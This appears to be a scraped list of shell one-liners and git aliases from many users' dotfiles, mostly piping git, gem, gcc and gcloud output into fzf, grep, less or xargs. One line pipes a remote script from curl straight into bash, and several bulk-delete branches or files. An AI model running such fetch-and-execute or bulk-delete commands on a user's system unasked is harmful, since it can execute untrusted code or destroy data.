git diff --name-only HEAD | xargs tar cvf $1
git diff --name-only HEAD | xargs rubocop -a
git diff --name-only HEAD | xargs rmate
git diff --name-only HEAD | xargs mate
git diff --name-only HEAD | xargs bundle exec rubocop -a
git diff --name-only HEAD | xargs ./node_modules/.bin/eslint
git diff --name-only HEAD | tr '\n' ' '
git diff --name-only HEAD | grep
git diff --name-only HEAD develop | xargs bundle exec rubocop
git diff --name-only --relative | uniq
git diff --name-only --relative master... | xargs -t pre-commit run --files
git diff --name-only --diff-filter=U | xargs subl
git diff --name-only --diff-filter=U | xargs code -n
git diff --name-only --diff-filter=U | xargs code
git diff --name-only --diff-filter=U | xargs -L1 sublime
git diff --name-only --diff-filter=U | less'
git diff --name-only --diff-filter=U -z | xargs -0 bash -c '</dev/tty nvim \
git diff --name-only --diff-filter=M|xargs git add
git diff --name-only --diff-filter=D|xargs git add
git diff --name-only --diff-filter=D -z | xargs -0 git rm --cached
git diff --name-only --diff-filter=D --relative -z -- . | xargs -0 git rm
git diff --name-only --diff-filter U | xargs code
git diff --name-only --cached | xargs -I {} rubocop --auto-correct -f progress {}
git diff --name-only --cached | more
git diff --name-only --cached | fzf --multi --color=dark --cycle --border --ansi --preview-window=up:70% --preview=\
git diff --name-only --cached -- '*.scss' '*.css' | xargs stylelint
git diff --minimal -w HEAD | cdiff -s -w 100
git diff --ignore-space-change | vim -
git diff --ignore-space-change | gitx --diff
git diff --ignore-space-at-eol | mate
git diff --ignore-space-at-eol | $EDITOR
git diff --ignore-all-space --color=always | less
git diff --full-index origin/master | tee ~/git/patch/templates.patch
git diff --full-index origin/master | tee ~/git/patch/resources.patch
git diff --full-index origin/master | tee ~/git/patch/php.patch
git diff --diff-filter=D --name-only -z | xargs -0 git rm
git diff --diff-filter=ACMR --name-only | xargs bundle exec rubocop
git diff --color=always | less -r
git diff --color=always | less -R
git diff --color=always | less
git diff --color=always | cat
git diff --color=always HEAD | less -r
git diff --color=always --staged | less -R
git diff --color=always -- . ':(exclude)*package-lock.json' | less
git diff --color=always $1 | less -R
git diff --color-words='\w+|.'
git diff --color-words --word-diff-regex='\\w|[^[:space:]]'
git diff --color-words --word-diff-regex='\\w+|[^[:space:]]' --cached
git diff --color-words --word-diff-regex='\\w+|[^[:space:]]'
git diff --color | ~/sandbox/diff-so-fancy/diff-so-fancy
git diff --color | ~/.git/diff-highlight
git diff --color | less -R
git diff --color | less -F -X -R
git diff --color | diff-so-fancy
git diff --color | diff-lines
git diff --color | cat
git diff --color --stat |cat
git diff --color --stat ...origin/$(git branch | grep
git diff --color --cached | diff-so-fancy
git diff --cached | vim - -R
git diff --cached | view -
git diff --cached | tm ; git commit
git diff --cached | mvim -
git diff --cached | mate
git diff --cached | less -R -S
git diff --cached | less
git diff --cached | gitx
git diff --cached | diff-so-fancy
git diff --cached | cdiff -s
git diff --cached | $EDITOR
git diff --cached . | cl
git diff --cached -U20 | gist -t diff
git diff --cached --word-diff-regex='\\w+|[^[:space:]]'
git diff --cached --stat=72 | pbcopy
git diff --cached --numstat | wc -l
git diff --cached --numstat | cut -f 3
git diff --cached --name-only | xargs -n 1 -p git reset HEAD
git diff --cached --name-only --diff-filter=ACM . | xargs -L1 git reset HEAD
git diff --cached --ignore-space-at-eol | mate
git diff --cached --ignore-space-at-eol | $EDITOR
git diff --cached --color=always | less -r
git diff --cached --color | less -s -M -R +Gg
git diff --cached --color | diff-so-fancy
git diff --cached --binary | gist -po -t diff
git diff --binary | mate
git diff --binary HEAD^ | mate
git diff --binary -U0 -w --no-color --ignore-blank-lines | git apply --cached --ignore-whitespace --unidiff-zero -
git diff --binary --cached | mate
git diff $* | kompare -
git diff $(glsm | pick)
git diff $(git log -1 --before=@{last.week} --format=%H) --shortstat | uniq
git diff $(git log -1 --before=@{last.month} --format=%H) --shortstat | uniq
git diff $(git log --pretty=format:%h -2 --reverse | tr
git diff $(git diff --name-only HEAD | fzf-tmux --tac -d 15)
git df | h
git df | fzf --border
git destroy `git all-branches | fzf`
git describe --tags `git rev-list --tags|head`
git describe --tags `git rev-list --tags` | head
git describe --long | sed 's/\([^-]*-g\)/r\1/;s/-/./g'
git describe --long --tags | sed -r 's/([^-]*-g)/r\1/;s/-/./g;s/v//'
git dc | colordiff
git current-branch | git pull origin
git ctags; cat ./.git/tags | unused --stdin -C
git config user.name asnr && git config user.email asnr@users.noreply.github.com && git config --list | grep user
git config user.email | git log --abbrev-commit --graph --format=oneline --since=6am --author=$1
git config -l | grep user
git config -l | grep gpg
git config -l | grep alias
git config -l | grep $(_git_current_branch)
git config -l | egrep alias
git config --local --list | grep `basename ~+`
git config --list|env egrep \^submodule
git config --list |grep alias
git config --list | grep url
git config --list | grep remote.origin.url
git config --list | grep alias
git config --list | grep ^alias
git config --list | grep '^alias\.'
git config --list | grep
git config --list --show-origin | grep core.autocrlf
git config --list --show-origin | column -t -s \
git config --global -l | grep alias
git config --global --list | grep ^alias\.
git config --get-regexp alias | sed -r 's/alias\.(\w+)\s+/\1=/'
git config --get-regexp alias | cut -d '.' -f 2
git config --get remote.origin.url | xclip -sel clip
git config --get remote.origin.url | xargs xdg-open
git config --get remote.origin.url | xargs open
git config --get remote.origin.url | xargs -I {} open {}
git config --get remote.origin.url | sed -e 's/.*@//' -e 's/.git$//' -e 's/:/\//'
git config --get remote.origin.url | ruby -ne 'puts %{https://github.com/#{\$_.split(/.com[\:\/]/)[-1].gsub(\
git config --get remote.origin.url | ruby -ne
git config --get remote.origin.url | awk -F:
git config --get remote.origin ; git branch -a | wc -l
git commit -a -t <(git rev-parse --abbrev-ref HEAD | sed 's/_/ /g; s/ /: /') && gpsup
git commit -a -t <(git rev-parse --abbrev-ref HEAD | sed 's/_.*$/: /') && git push
git commit --allow-empty && git push origin master && git rev-parse HEAD && git rev-parse HEAD | clipboard
git cola &>/dev/null&|
git co master && git pull -p && git branch -d `git branch --merged | grep -v master`
git co master && git fetch -p && git pl && git branch --merged | egrep -v \
git co client && git co server && find . -iname 'nohup.out' ! -type l | xargs rm -rv
git co \$(git branch | selecta)
git co -b $(git br -r | fzf)
git co $(git_recent_branches | fzf)
git co $(git branch | fzf)
git co $(git br | peco)
git co $(git br | fzf)
git co $(git b | peco)
git clone --depth=1 https://github.com/synoa/ansible-boilerplate.git . && yes | rm -r .git
git clean --dry-run | awk '{ print \$3 }'
git ck master && git log --oneline --decorate --color --graph | head
git ck develop && git log --oneline --decorate --color --graph | head
git churn --since='3 months ago' . | tail -10
git cherry-pick $(git branch | fzf)
git cherry -v origin/master | wc -l
git cherry -v master | wc -l
git cherry -v develop | sed -e \
git cherry -v dev | wc -l
git checkout staging && git pull --rebase && git submodule update && git checkout master && git pull --rebase && git rebase staging && git push && git tag | sort --version-sort
git checkout origin/master -- $(git ls-files |
git checkout master; git pull; git branch --merged | egrep -v \
git checkout master; git pull origin master; git fetch --all -p; git branch -vv | grep \
git checkout master; git branch | grep -v
git checkout master && git pull origin master && git fetch -p && git branch -d $(git branch --merged | grep master -v)
git checkout master && git pull && git remote prune origin && git fetch --prune && git branch -vv | awk
git checkout master && git fetch -p && for branch in `git branch -vv | grep
git checkout master && git fetch && git rebase origin/master && git branch --merged | grep -v \
git checkout master && git branch | grep -v
git checkout master && git branch -D develop | git checkout -b develop && git merge uJoystick missions scripts pSimplePID
git checkout develop | git pull
git checkout develop && git pull --rebase && git submodule update && git checkout staging && git pull --rebase && git rebase develop && git push && git checkout master && git pull --rebase && git rebase staging && git push && git tag | sort --version-sort
git checkout develop && git pull && git remote prune origin && git fetch --prune && git branch -vv | awk
git checkout develop && git branch --merged | egrep -v \
git checkout `git rev-list --topo-order HEAD..$1 | tail -1`
git checkout `git branch | peco`
git checkout `git branch | fzy`
git checkout `git branch | fzf`
git checkout `git branch | fzf-tmux`
git checkout `git branch --list | fzf`
git checkout \`git branch | fzf\`
git checkout \`git branch | fzf \`
git checkout \`git branch --sort=-committerdate | fzf\`
git checkout \$(git branch|fzf)
git checkout \$(git branch | pick)
git checkout \$(git branch | fzf)
git checkout \$(git branch | fzf --cycle --ansi)
git checkout \$(git branch -ra | fzf)
git checkout \$(git branch -a | fzf)
git checkout \$(git branch --format '%(refname:short)' --sort '-committerdate' | sk)
git checkout --track `git branch -r | fzf`
git checkout --track `git branch -r --sort=committerdate | fzf`
git checkout --track \$(git branch -r | fzf)
git checkout --track $(git branch -r | fzf)
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n`
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n-1`
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=3`
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=2`
git checkout -- `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=1`
git checkout -- $(git diff --name-only HEAD | fzf-tmux --tac -d 15)
git checkout -- $(git diff --name-only --relative | fzf)
git checkout $(git tag | fzf-tmux -r 30% --reverse)
git checkout $(git tag | fzf)
git checkout $(git rev-list HEAD..master | tail -n 1)
git checkout $(git log --ancestry-path --format=%H ${commit}..master | tail -1)
git checkout $(git branch|peco)
git checkout $(git branch |fzf)
git checkout $(git branch | percol)
git checkout $(git branch | peco)
git checkout $(git branch | fzy)
git checkout $(git branch | fzf-tmux -r 30% --reverse)
git checkout $(git branch | fzf-tmux --tac -d 15)
git checkout $(git branch | fzf)
git checkout $(git branch | fzf -d 10)
git checkout $(git branch | fzf --layout=reverse) 2> /dev/null
git checkout $(git branch | fzf --height 50% --border --ansi --tac)
git checkout $(git branch | fzf --height 40% --reverse)
git checkout $(git branch | awk
git checkout $(git branch -r | fzf)
git checkout $(git branch -l | fzf)
git checkout $(git branch -a | percol)
git checkout $(git branch -a | peco)
git checkout $(git branch -a | fzf)
git checkout $(git branch --sort=-committerdate | fzf)
git checkout $(git branch --sort=-committerdate | fzf --height 40%)
git checkout $(gb | fzf)
git checkout $(__git_refs | percol)
git changed | xargs nvim
git brs | tail
git branch|grep -v '^\\*'
git branch|cat
git branches | head
git branch-by-date|head
git branch-by-date | head
git branch |grep -v __merged
git branch |grep
git branch | xargs git branch -d
git branch | xargs git branch -D && git pull
git branch | xargs git branch -D
git branch | xargs echo
git branch | xargs -n 1 git branch -d
git branch | xargs -I {} git branch -D {}
git branch | vim -
git branch | sed -n '/\* /s///p'
git branch | sed '/^\*/!d; s/^\* //'
git branch | sed '/^$/d'
git branch | perl -ne
git branch | p git checkout
git branch | nvim -MR -
git branch | nl
git branch | lolcat
git branch | grep ^*
git branch | grep \* && git rev-parse HEAD
git branch | grep \* $1
git branch | grep \*
git branch | grep \
git branch | grep AA
git branch | grep -v spring
git branch | grep -v remote
git branch | grep -v origin
git branch | grep -v \
git branch | grep -v -E \
git branch | grep -v
git branch | grep -i $1
git branch | grep -i
git branch | grep -E
git branch | grep --color '*'
git branch | grep 'own-'
git branch | grep '^\*'
git branch | grep '*'
git branch | grep
git branch | fzf-tmux -d 15
git branch | fzf-tmux -d 10 --ansi --reverse
git branch | fzf --preview='git diff --color=always master {1}'
git branch | fzf
git branch | f
git branch | egrep -v \
git branch | cowsay -f tux
git branch | cat -n
git branch | cat
git branch | bat
git branch | awk '{for (i = 1; i <= NF; i++){if (\$i != \
git branch | awk '/^*/{print $2}'
git branch | awk '/\*/ {system(\
git branch | awk '/\*/ {print \$0; }'
git branch | awk
git branch | ag
git branch | ack 'ITPL.*[a-zA-Z]' --no-color
git branch 2>/dev/null | sed -ne 's/^* \(.*\)/ \1/p'
git branch 2>/dev/null | sed -ne 's/^* \(.*\)/ (\1\)/p'
git branch 2>/dev/null | sed -ne 's/^* \(.*\)/ ${PARENCLR}(${BRANCHCLR}\1${PARENCLR}\)/p'
git branch 2> /dev/null | sed -e \
git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1/'
git branch -v|grep -e
git branch -v|grep
git branch -vv|grep gone
git branch -vva | grep -i $1
git branch -vv | ig gone
git branch -vv | grep gone
git branch -vv | grep ahead
git branch -vv | grep -v origin/
git branch -vv | grep -E \
git branch -vv | grep 'origin/.*: gone]'
git branch -vv | grep '*'
git branch -vv | grep
git branch -vv | awk '/: gone]/{print $1}'
git branch -vv --color=always | grep gone
git branch -vv --color=always | grep behind
git branch -vv --color=always | grep ahead
git branch -vv --color=always | fzf --ansi
git branch -vv --color=always | cat
git branch -vv --color | grep -v '\[.*\/.*\] '
git branch -vr --color | grep -v 'origin/HEAD'
git branch -va | grep -i
git branch -va --color | grep -v 'remotes/origin/pr'
git branch -v | grep '*'
git branch -v | cat
git branch -r|grep remote-run
git branch -r| awk -F '[/]' '/feature\// {printf
git branch -r |gpep
git branch -r | xargs -t -n 1 git branch -r --contains
git branch -r | sed
git branch -r | grep origin
git branch -r | grep -v
git branch -r | grep ${USER}
git branch -r | grep
git branch -r | awk
git branch -r | ag
git branch -r --no-merged | xargs -n 1 git --no-pager show -s --format='%d %an <%ae>'
git branch -r --merged | grep $@
git branch -m $(git symbolic-ref HEAD 2> /dev/null | cut -b 12-) $newbranch
git branch -la | wc -l
git branch -l | xargs git branch -d ; git fetch --prune
git branch -l | cat
git branch -d `git branch | fzf-tmux`
git branch -d \$(git branch | pick)
git branch -d $(git branch | pf)
git branch -d $(git branch | peco)
git branch -d $(git branch | grep -v master)
git branch -d $(git branch | fzf)
git branch -d $(git branch --merged=master | grep -v master); git fetch --prune
git branch -d $(git branch --merged=master | grep -v master) && git fetch --prune
git branch -d $(git branch --merged=master | grep -v master)
git branch -d $(git branch --merged |tail -n +2)
git branch -av | cat
git branch -a |grep
git branch -a | sed -
git branch -a | peco
git branch -a | grep .
git branch -a | grep -i develop
git branch -a | grep -i
git branch -a | grep $@
git branch -a | grep $1
git branch -a | grep $*
git branch -a | grep
git branch -a | fzf-tmux
git branch -a | fzf
git branch -a | filter
git branch -a | egrep -i
git branch -a | egrep
git branch -a | cat -
git branch -a | awk
git branch -a -v|grep \*
git branch -a -vv | grep behind
git branch -a -vv | grep ahead
git branch -a -vv --color=always | perl -pe
git branch -a -v --color | cat
git branch -a --sort=-committerdate --color -v | head
git branch -a --merged | grep origin/master
git branch -D `git for-each-ref --format='%(refname:short)' refs/heads/pr\[0-9]\[0-9]\[0-9]\[0-9] | tr '\n' ' '`
git branch -D `git branch | peco`
git branch -D \$(git branch | pick)
git branch -D 'git branch | grep -E 'IVMA-..*''
git branch -D $(git branch | peco)
git branch -D $(git branch | grep -v master)
git branch -D $(git branch | fzf-tmux -r 30% --reverse --multi)
git branch -D $(git branch | fzf)
git branch -D $(git branch | fzf -m)
git branch -D $(git branch -a | fzf)
git branch -D $(git branch --merged=master | grep -v master)
git branch -D $(git branch --merged | tail -n +2)
git branch --sort=committerdate | tail -n 10
git branch --sort=committerdate | tail -20
git branch --sort=committerdate --color | tail -n 5
git branch --sort=-committerdate| head -n 1
git branch --sort=-committerdate| head $1
git branch --sort=-committerdate | tail -r
git branch --sort=-committerdate | head -n10
git branch --sort=-committerdate | head -n 5
git branch --sort=-committerdate | head -n 10
git branch --sort=-committerdate | head -n
git branch --sort=-committerdate | head -5
git branch --sort=-committerdate | head -10
git branch --sort=-committerdate | head
git branch --sort=-committerdate | cat
git branch --sort=-committerdate --color=always | head -n 8
git branch --sort=-committerdate --color | head
git branch --remote --merged origin/master | grep -v
git branch --no-merged origin/master --sort=-committerdate | head -n 10
git branch --no-color | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1/'
git branch --no-color | grep \
git branch --no-color 2> /dev/null | sed -e /^[^*]/d -e \
git branch --no-color 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1/'
git branch --no-color 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/\1 /'
git branch --no-color 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/@\1 /'
git branch --no-color --merged | grep -v
git branch --no-color --merged | command grep -vE \
git branch --merged | xargs git branch -d; git branch
git branch --merged | xargs git branch -d
git branch --merged | xargs git branch -D
git branch --merged | grep -vE
git branch --merged | grep -v master
git branch --merged | grep -v \
git branch --merged | grep -v '\*'
git branch --merged | grep -v
git branch --merged | grep -e
git branch --merged | egrep -v \
git branch --merged | egrep -v
git branch --merged origin/master | grep -v \
git branch --merged origin/master | grep -v
git branch --merged master | grep -vE
git branch --merged master | grep -v \
git branch --merged master | grep -v
git branch --merged master | egrep -v \
git branch --merged master |
git branch --merged master --no-color | grep -v
git branch --merged develop | grep -v \
git branch --merged develop | grep -v 'develop$'
git branch --list | xargs -I{} echo {}
git branch --list | cat
git branch --delete $(git branch | fzf -m)
git branch --contains=HEAD | sed
git branch --contains HEAD | grep $(default-branch)
git branch --color=always --remote --verbose | more
git branch --color | cat
git branch --color -v | cut -c1-100
git branch --color -a | grep --color=never -v ' trash/'
git branch --all | grep
git branch --all | cat
git branch --all --color --sort=-committerdate | grep -i
git branch - r | grep
git branch && (git -c color.status=always status | sed 's/On branch .*//')
git br | uniq -f 1
git br | grep
git br | g? $1
git br | egrep -v \
git br -d `git branch | peco`
git br -d $(git branch | fzf)
git br -d $(git br | grep -v master)
git br -d $(git br --list | fzf-tmux)
git br -a | grep -v 'remotes'
git br -a | grep
git br -D `git br | xargs`
git bl | sed 's/refs\/heads\///g'
git b | grep -i
git b | FZF
git b -d $1 | git push pub :$1
git b --merged | grep -v \
git archive master | tar -x -C $@
git archive master | tar -x -C
git archive master --prefix ${PWD##*/}/ | bzip2 > ~/packages/${PWD##*/}.tar.bz2
git archive master --format=tar | gzip >~/Desktop/$@.tar.gz
git archive --format=tar --remote=$1 master | tar -xf -
git archive --format=tar --prefix=spinic-0.1.2/ 0.1.2^{tree} | gzip > ../spinic-0.1.2.tar.gz
git antebase log | head
git alias | grep
git add | fzf
git add | fpp
git add `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD`
git add .; git ls-files --deleted | while read FILE; do git rm $FILE; done
git add .&&git ls-files --deleted | xargs git rm
git add . |git commit --amend -m $1
git add . |gc
git add . | lolcat
git add . | git nccommit
git add . ; find . -size +50M ! -path *git* | xargs git reset HEAD
git add . && git diff --cached | gist -pot diff; git reset .
git add -p `git status --ignore-submodule --porcelain | cut -c4-`
git add -N \`git status --porcelain | sed -ne 's/^?? ~\/bomnegocio\//p'\`
git add -N \`git status --porcelain | sed -ne 's/^?? /\/home\/tlima\/bomnegocio\//p'\`
git add -A; git ls-files --deleted -z | xargs -r0 git rm; git commit -m \
git add -A; git ls-files --deleted -z | xargs -r0 git rm; git commit -m
git add -A; git ls-files --deleted -z | xargs -0 git rm; git commit -m \
git add -A; git ls-files --deleted -z | xargs -0 git rm
git add -A; git ls-files --deleted -z | xargs ${XARGS_OPTS} -0 git rm; git commit -m \
git add -A; git diff --cached -w | git apply --cached -R
git add -A && read -p 'Commit message: ' | git commit -m
git add -A && git diff --cached -w | git apply --cached -R
git add $(glsu | pick)
git add $(glsm | pick)
git add $(git ls-files | fzf -m)
git add $(git ls-files -m -o --exclude-standard | fzf)
git add $(git ls-files --exclude-standard --others | fzf -m)
git add $(git diff --name-only HEAD | fzf-tmux --tac -d 15)
git ab | tail -n 20
git -c color.ui=always status | less -REX
git -c color.ui=always log --oneline | head -20
git -c color.status=always status | less -r
git -c color.status=always status | less -RFX
git -c color.status=always status | less -REX
git -c color.status=always status | less -R
git -c color.status=always status | head -n20
git -c color.status=always status -s | grep --color=never -vE '\\a?[$i]\\b'
git -c color.status=always status -s | grep --color=never -E '\\a?[$i]\\b'
git -c color.status=always status -s --untracked-files=normal | grep --color=never -E '.?[?]\\B'
git -c color.status=always status -s --ignored=traditional | grep --color=never -E '.?[!]\\B'
git -C ~/.config/shell/z.lua pull && git -C ~/.config/shell/powerlevel10k pull && curl https://raw.githubusercontent.com/mjlbach/vim_it_up/master/scripts/update.sh -sSf | bash
git --no-pager stash list | head
git --no-pager reflog | awk '\$3 == \
git --no-pager reflog | awk
git --no-pager log -s --format='%ae' | sort -u
git --no-pager log --oneline --decorate --color | head
git --no-pager log --oneline --all --decorate --graph -40 --pretty=format:'%h %ad | %s%d [%an]'
git --no-pager log --color=always --oneline | head
git --no-pager log --color=always --oneline --graph | head
git --no-pager log --color --oneline -n16 | emojify
git --no-pager diff --name-only master | xargs $EDITOR
git --no-pager branch -a | grep lnunno
git --help | less
git --git-dir=$WK/.git log | grep
gistit -priv | sed
gist -p -P | pbcopy
gist -l | grep
gipv4 | sipv4
ghq-list | peco
ghq look `ghq list | peco`
ghq look \`ghq list | peco\`
ghq look \$(ghq list | peco)
ghq look $(ghq list | peco)
ghq look $(ghq list | peco --layout bottom-up)
ghq look $(ghq list | fzf)
ghq look $(ghq list | $FILTERING_TOOL)
ghq look $(basename $(ghq list -p | peco))
ghq list | fzf
ghq list -p | peco
ghq list -p | pe cd
ghq list -p | pdo cd
ghq list -p | p pushd >/dev/null; hub browse; popd >/dev/null
ghq list -p | p cd
ghq list -p | fzf --prompt 'GHQ> ' --height 40% --reverse
ghq list -p | fzf
ghq list -p | f cd
ghq list -p | __filter_execute gh-open
ghq list -p | __filter_execute cd
ghq list -p feedforce | p cd
ghq list --full-path | peco-src cd
ghm | cat
ghi | grep ↑
ghead -c -1 | pbcopy
ghdotfiles ; ghdotfiles-termux ; ghstudy ; ghfirstwebsite ; ghpomodoro ; fortune | cowsay; cd
ghci\ \2\>\&\1\|\HsColour\ \-tty
ghci 2>&1 | HsColour -tty
ghci 2>&1 | HsColour
gh-open $(ghq list -p | peco)
gh-open $(ghq list -p | fzf)
ggrep -Pv '^($|#)'
ggrep --line-buffered --color=never -r '' err.txt generated.file succ.txt | fzf
ggl | head -30
ggg | more
gg+ | head -n `expr $LINES / 2`
gg | serve
gg | head -n5
gfind . \( -name '*.lua' -o -name '*.moon' \) ! -path '*/node_modules/*' ! -path '*.min.*' ! -path './env/*' ! -path './env/*' ! -path './.git/*' -print | xargs grep --color
gfind . \( -name '*.js' -o -name '*.jsx' -o -name '*.html' -o -name '*.css' \) ! -path '*/node_modules/*' ! -path '*.min.*' ! -path './env/*' ! -path './env/*' ! -path './.git/*' -print | xargs grep --color
gfind . -name '*.py' ! -path './env/*' ! -path './env/*' ! -path './.git/*' -print | xargs grep --color
gfiles | xargs grep $@
gfiles | fpp -c subl
gfea; touch branches.now.lst; mv branches.now.lst branches.old.lst; gblr | sort > branches.now.lst; vdiff branches.old.lst branches.now.lst
gfb | xargs git checkout
gettime | sed 's#....\$##'
gettime | sed 's#......\$##'
gettext $(ls -1 | wc -l)
getmetadata description 2>/dev/null| cowsay
getmac | nkf -w
getip-local | pbcopy
getip | pbcopy
getent passwd|column -t -s: -n
getent passwd | cut -d: -f1
getent passwd | column -t -s:
getent group|column -t -s: -n
getent group | grep lpccvmfs
getent group | column -t -s:
getent group sudo | cut -d: -f4
getent group sudo | cut -d':' -f4-
getclip | luac -l -
getbranch | pbcopy && echo Copied $(getbranch) to clipboard
get_xclip | xclip
get_random_phone | tr -d
get_iplayer --pid tv:$1 --stdout --nowrite | mplayer -cache 512 -
get_iplayer --pid radio:$1 --amode=flashaac --stdout --nowrite | mplayer -cache 128 -
get_iplayer $0 | grep desc:
get_docker_names | xargs docker stats
get_current_branch | pbcopy
get-finder-selection | gxargs -d '\n'
get-date-from-hex-unixtime | date -d @$_
gem update $(gem list | cut -d\ -f 1)
gem outdated | grep -f ~/.dotfiles/default-gems
gem list|grep
gem list | tee ~/Dropbox/Elements/runx\ gems.txt
gem list | less
gem list | grep rails
gem list | grep -i $1
gem list | grep -i
gem list | grep $@
gem list | grep $1
gem list | grep
gem list | g? \$1
gem list | cut -d\
gem list | cut -d
gem list | awk \
gem list | awk '{ print \$1 }'
gem list | ack
gem list -rd --no-update-sources | less
gem list -ra rails | grep 'rails ('
gem list -r | grep -i
gem list --no-version | xargs gem uninstall -aIx
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n`
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n-1`
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=3`
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=2`
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=1`
gdu -sh err.txt generated.file succ.txt | gsort -rh
gdu -hs err.txt generated.file succ.txt | gsort -h
gdu -d 0 -h err.txt generated.file succ.txt | sort -hr
gdu -ahd1 | gsort -hr
gdu -Phc -d 1 | sort -h
gdu --max-depth=1 | sort -k2
gdu --max-depth=1 | sort -h
gdrive_m | mono ~/KeePass/KeePass.exe &
gdrive download -r $(x -o | cut -d = -f 2)
gdnr | vimo
gdm | rg -v -e \
gdm --name-only | cat
gdlistdownload | tee log.txt
gdl | xargs git rm
gdiff | xargs -I{} rsync --relative {}
gdiff | lessr
gdiff --color | diff-so-fancy
gddd --name-only | cat
gdc | vim-pager
gdc | vim -
gdc | grep '^---'
gdbCandidates | xargs git branch -D
gdb /usr/local/freeswitch/bin/freeswitch `ls -rt core.* | tail -n1`
gdb /usr/local/freeswitch/bin/freeswitch \`ls -rt core.* | tail -n1\`
gdb /usr/bin/freeswitch `ls -rt core.* | tail -n1`
gdb --pid $(ps ux | awk '/gvfsd-gdocs/ && !/awk/ {print $2}')
gdb --args compiz --replace 2>&1 | tee /home/bschaefer/gdb-compiz-`date +%Y%m%dT%H%M%S`.txt
gdb $bindir/freeswitch `ls -rt core.* | tail -n1`
gdate --rfc-3339=seconds | sed 's/ /T/'
gd | vim-pager
gd | vim -
gd | head
gd | grep '^---'
gd | $EDITOR -R -
gd head^! --ignore-space-change | subl
gd --name-only | xargs code
gd --color-words --word-diff-regex='\\w+|.'
gconftool-2 --type string --set /desktop/gnome/background/picture_filename $(find /home/sas/pictures |shuf -n 1)
gcod && gplod && gcom && gplom && gcod && git diff master | subl
gco master && for b in $(gbv|awk
gco `gb|fzf`
gco --track $(git branch -r | fzf)
gco $(git branch | fzf-tmux -d 15)
gco $(git branch | fzf)
gco $(git branch -a | fzf)
gco $(gb | grep
gco $(gb | fzf)
gcloud info | grep project
gcloud info | grep account
gcloud config configurations list | grep True
gcloud compute instances list | grep ${1}
gcloud compute instances list | grep
gcloud compute config-ssh --ssh-config-file ~/.ssh/config --remove && gcloud compute config-ssh --project snapchat-chat --ssh-config-file /tmp/gce_ssh_config_dummy_file --dry-run | grep -v \
gcloud auth print-access-token | docker login -u oauth2accesstoken --password-stdin https://gcr.io
gcloud app describe | grep codeBucket
gclassic && ./script/feature list | grep voice
gch $(git branch --all | fzf)
gch $(g branch | fzy)
gcc 2>&1 | tee /tmp/quickfix.err
gcc -v -E -xc -march=native - </dev/null 2>&1 | perl -ne 's/\s-mno-\S+//g; s/^.*\s-s//g; print if /cc1/'
gcc -v -E -xc -march=native - </dev/null 2>&1 | grep -F 'cc1'
gcc -march=native -E -v - </dev/null 2>&1 | sed -n 's/.* -v - //p'
gcc -march=native -E -v - </dev/null 2>&1 | grep cc1
gcc -dM -E -x c /dev/null | cut -c 9-
gcc -dM -E -x c - </dev/null | sort
gcc -dM -E - < /dev/null | sort
gcc -c -Q -march=native --help=target | grep march
gcc -E -dM - </dev/null | sort
gcc --help -v | less
gcc *c |./a.out
gcb | xargs git push upstream
gcb | xargs git push origin --force-with-lease
gcb | xargs git push origin
gcb | pbcopy
gcalcli agenda | $PAGER
gcal . | lolcat
gc $(gb | fzf)
gbspruge | xargs -n 1 git branch -d
gbspruge | xargs -n 1 git branch -D
gbsfpruge | awk '{ print \$1 }'
gbrt | grep -e '\wdev\/.*$'
gbrname | pbcopy
gbr | grep
gbr --no-merged master | sed 's/^ origin\///g'
gbname | xclip -selection clipboard
gbname | pbcopy
gbmm | xargs -n 1 git branch -d
gbmd | xargs -n 1 git branch -d
gbm master | grep -v master
gbm $GIT_DEV_BRANCH | grep -v $GIT_DEV_BRANCH
gblbd | grep -vE 'origin'
gblbd | grep 'weeks'
gbl | cpin
gbjira | grep `gbcur`
gbf | xargs git checkout
gbd $(gb | fzf)
gbc | pbcopy
gba | grep sroy
gba | grep
gbD $(gb | fzf)
gb; echo;git log | head -5
gb | xargs git branch --delete
gb | while read branch; do gb -D $branch; done
gb | head -n 10
gb | head -20
gb | head
gb | grep -v
gb | grep $1
gb | grep
gb | gi behind
gb | gi
gb | cat
gb -vv | grep behind
gb -vv | grep -e behind -e ahead
gb -r | head -3
gb -r | grep -i
gb -r | cat
gb -D $(gb | fzf -m)
gb --sort=-committerdate | head -n10
gb --sort=-committerdate | head
gb --contains | cut -b 3-
gad | xargs rm -r 2>/dev/null
ga | head
ga | grep $lookgor
ga | grep
ga --all .; git diff --cached | $EDITOR -
gRecent | less
g5df | xargs sort_java_import
g5df | xargs git5 lint
g.ls | fzf -m --preview 'git diff HEAD {}'
g-remote-merged-branches_orig | xargs -I{} sh -c 'echo {};git rev-parse {};echo
g-remote-merged-branches | xargs -I% git push origin :%
g-merged-branches | xargs -I% git branch -d %
g++ 2>&1 | tee /tmp/quickfix.err
g++ -dM -E -x c++ /dev/null | grep -F __cplusplus
g | clear
g watch --color | node_modules/.bin/bunyan
g tag --sort=-v:refname |& less -F
g status | lolcat
g st | cut -c4-
g show | grep 'Debug\.log'
g rev-list HEAD..master | tail -n 1
g push | lolcat
g push -u origin HEAD 2>&1 | urlview
g pull | lolcat
g p && g fetch -p && g branch -r && g tree | head -n 4
g ls-files|grep --color=auto
g ls-files | grep -i
g ll | ack
g lg | ag 'hours' --nocolor
g lc | head -n 1
g l | head
g hist | vim -R -c 'set filetype=git' -
g for-each-ref --sort='-authordate' --format='%(authordate)%09%(objectname:short)%09%(refname)' refs/heads | sed -e 's-refs/heads/--'
g diff | subl
